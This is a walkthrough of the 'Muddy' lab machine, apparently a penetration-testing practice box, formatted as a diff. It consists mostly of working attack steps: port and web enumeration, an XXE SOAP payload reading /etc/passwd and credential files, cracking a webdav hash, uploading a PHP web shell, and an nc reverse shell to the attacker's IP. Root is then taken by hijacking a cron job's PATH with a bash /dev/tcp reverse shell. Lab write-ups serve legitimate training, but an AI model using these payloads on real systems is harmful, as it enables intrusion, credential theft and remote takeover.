@@ -1,0 +1,213 @@
+																							              Muddy Walkthrough
+																										
+Attacker's Machine: 192.168.45.5
+Victim's Machine: 192.168.232.161
+export IP=192.168.232.161
+	
+1. nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+2. nmap -Pn -n -sC -sV -p22,25,80,111,443,808,908,8888 $IP --open --stats-every=5s -oN results.txt
+
+22/tcp   open  ssh           OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+25/tcp   open  smtp          Exim smtpd
+80/tcp   open  http          Apache httpd 2.4.38 ((Debian))
+|_http-title: Did not follow redirect to http://muddy.ugc/
+111/tcp  open  rpcbind       2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|_  100000  3,4          111/udp6  rpcbind
+443/tcp  open  https?
+808/tcp  open  ccproxy-http?
+908/tcp  open  unknown
+8888/tcp open  http          WSGIServer 0.1 (Python 2.7.16)
+
+Service Info: OS: Linux;
+
+3. nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000  
+
+111/udp  open   rpcbind
+
+Vulnerability Assessment <!-- nothing -->
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+/readme.html: Wordpress version: 2 
+|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
+|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
+|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
+|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
+|   /wp-admin/upgrade.php: Wordpress login page.
+|   /readme.html: Interesting, a readme.
+|_  /webdav/: Potentially interesting folder (401 Unauthorized)           // requires authentication!!
+
+nikto --url $IP 
+
+
+Port 25 Enumeration
+smtp-user-enum -M VRFY -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t $IP -p 25           //      SMTP EHLO muddy.ugc: failed to receive data: connection closed
+
+Port 80 Enumeration
+Files  <!-- nothing -->
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404,429 -t 30 -R3 "http://$IP/FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt --hc 404 -t 30 "http://$IP/FUZZ"
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/big.txt  -o gobuster.txt -t 50 -x zip,php,txt 
+
+Directories <!-- nothing -->
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --hc 404 -t 30 "http://$IP/FUZZ/"
+wfuzz -c -z file,/usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 -t 30 "http://$IP/FUZZ/"
+wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$IP/FUZZ/"
+
+wpscan
+wpscan --url http://muddy.ugc --no-update --disable-tls-checks --enumerate p --enumerate t --enumerate u
+Theme in use: shapely    1.2.11   <!-- nothing -->
+
+wpscan --url http://muddy.ugc --no-update --disable-tls-checks --enumerate p
+Plugin(s) Identified: kali-forms 2.3.0   <!-- nothing -->
+
+
+Port 8888 
+When you access the application, you can see Powered by Ladon for Python.
+
+searchsploit ladon
+Ladon Framework for Python 0.9.40 - XML External Entity Expansion                                                              | xml/webapps/43113.txt
+
+https://www.exploit-db.com/exploits/43113
+
+Configure Burp to bind the requests send from 8888.
+
+Proxy → Options → (Proxy Listeners) Add → [Binding] Port 8888 → [Request Handling] Request to Host : 192.168.232.161
+																														      Request to port: 8888
+
+
+Copy and edit the payload from the exploit
+
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://localhost:8888/HelloService/soap11/sayhello\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:HelloService\"><soapenv:Header/>
+<soapenv:Body>
+<urn:sayhello soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:sayhello>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://localhost:8888/HelloService/soap11' | xmllint --format -
+
+Replace HelloService with muddy and sayhello with the method checkout, which is available on the page http://muddy.ugc:8888/muddy/
+
+Send the request with curl and intercept the request:
+
+curl -s -X $'POST' \
+-H $'Content-Type: text/xml;charset=UTF-8' \
+-H $'SOAPAction: \"http://localhost:8888/muddy/soap11/checkout\"' \
+--data-binary $'<?xml version="1.0"?>
+<!DOCTYPE uid
+[<!ENTITY passwd SYSTEM "file:///etc/passwd">
+]>
+<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
+xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
+xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
+xmlns:urn=\"urn:muddy\"><soapenv:Header/>
+<soapenv:Body>
+<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
+<uid xsi:type=\"xsd:string\">&passwd;</uid>
+</urn:checkout>
+</soapenv:Body>
+</soapenv:Envelope>' \
+'http://localhost:8888/muddy/soap11' | xmllint --format -
+
+Once you intercept the request and send it to repeater, you should receive the contents of the /etc/passwd file.
+Nothing too usefull there, we have the user ian but no bash shell present there.
+Maybe we can get the .SSH key
+file:///home/ian/.ssh/id_rsa 
+file:///home/ian/.ssh/id_rsa.pub
+file:///home/ian/.bash_history
+file:///var/www/html/wp-config.php
+Nothing
+
+
+Do you remember that we had the service  /webdav/ on the port 80?
+Let's try to receive the contents of the password file for webdav, but we need to find the default path for it.
+
+/var/www/html/webdav/passwd.dav
+/etc/httpd/conf.d/webdav.conf
+/var/www/html/webdav/password
+/var/www/html/webdav/dav.password
+/var/www/html/webdav/webdav.password
+
+Serial number: administrant:$apr1$GUG1OnCu$uiSLaAQojCm14lPMwISDi0
+
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt      
+
+administrant : sleepless
+
+
+Since we know that webdav is an HTTP extensions that allows us to upload files, let's try to upload a reverse_shell on the server using curl since we got nothing on the front end.
+
+nano code_exec.php
+<?php system($_REQUEST['cmd']); ?>
+
+curl -T code_exec.php -u "administrant:sleepless" http://192.168.232.161/webdav/
+
+<p>Resource /webdav/code_execution.php has been created.</p>
+
+Now try to obtian shell through RCE into the cmd parameter
+
+nc -lvnp 4444
+http://muddy.ugc/webdav/code_execution.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.45.5%204444%20%3E%2Ftmp%2Ff
+
+Got Shell!!
+
+
+Privilege Escalation
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/sbin/exim4
+/usr/sbin/mount.nfs
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/newgrp
+/usr/bin/sudo
+/usr/bin/gpasswd
+
+crontab -l
+@reboot /usr/local/bin/ladon-2.7-ctl testserve /var/tmp/ladon/muddy.py -p 8000
+
+cat /etc/crontab
+PATH=/dev/shm:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+*  *    * * *   root    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status
+
+Aparently our job got even easier, the crontab uses the world writable /dev/shm in path
+
+So, since the netstat command is missing the aboslute path, we can try to hijack it.
+
+cd /dev/shm
+nano netstat
+#!/bin/bash
+bash -c 'exec bash -i &>/dev/tcp/192.168.45.5/5555 <&1'
+
+chmod 777 netstat
+nc -lvnp 5555
+connect to [192.168.45.5] from (UNKNOWN) [192.168.232.161] 40474
+bash: cannot set terminal process group (5385): Inappropriate ioctl for device
+bash: no job control in this shell
+root@muddy:~# cat /root/proof.txt         // b5050e96dbd06a0645db84e33f9d74ba
